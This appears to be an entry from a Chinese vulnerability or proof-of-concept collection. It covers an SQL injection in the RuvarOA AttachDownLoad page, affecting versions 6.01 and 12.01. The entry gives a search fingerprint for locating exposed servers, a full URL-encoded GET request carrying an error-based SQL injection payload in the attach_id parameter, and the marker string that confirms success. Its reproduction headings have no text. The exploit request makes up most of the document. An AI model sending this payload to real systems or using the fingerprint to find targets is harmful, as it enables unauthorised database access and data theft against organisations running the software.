# RuvarOAAttachDownLoad存在SQL注入漏洞

- **系统**：RuvarOAAttachDownLoad　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /Mobile/Bulletin/AttachDownLoad.aspx?attach_id=1%27%29+AND+2821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%282821%3D2821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2B`

**请求体 / payload**
```
qxbxq1qqvqq
```

**其他**
- RuvarOA AttachDownLoad存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01